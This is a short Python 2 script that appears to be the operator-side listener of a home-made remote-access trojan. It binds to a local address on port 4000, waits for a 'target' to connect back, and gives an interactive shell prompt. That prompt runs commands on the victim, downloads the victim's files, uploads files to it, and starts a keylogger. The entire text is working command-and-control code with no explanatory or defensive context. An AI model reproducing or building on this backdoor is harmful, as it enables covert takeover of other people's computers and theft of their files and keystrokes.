#!/usr/bin/python


import base64
import json
import socket

count=1

def reliable_send(data):
	json_data=json.dumps(data)
	target.send(json_data)
def reliable_recv():
	json_data=""
	while True:
		try:
			json_data+=target.recv(1024)
			return json.loads(json_data)
		except ValueError:
			continue
def shell():
	global count
	while True:
		command=raw_input("*Shell#~%s:"%str(ip))
		reliable_send(command)
		if command=="q":
			break
		elif command[:2]=="cd" and len(command)>1:
			continue
		elif command[:8]=="download":
			with open(command[9:],"wb")as file:
				result=reliable_recv()
				file.write(base64.b64decode(result))
		elif command[:12]=="keylog_start":
			continue
		elif command[:6]=="upload":
			try:
				with open(command[7:],"rb") as fin:
					reliable_send(base64.b64encode(fin.read()))
			except:
				failed="failed to upload"
				reliable_send(base64.b64encode(failed))


		else:
			result=reliable_recv()
			print(result)
	
def server():
	global s
	global ip
	global target
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
	s.bind(("192.168.1.26",4000))
	s.listen(5)
	print("listening for incoming connection")
	target, ip=s.accept()
	print("target connected")
server()
shell()
s.close()
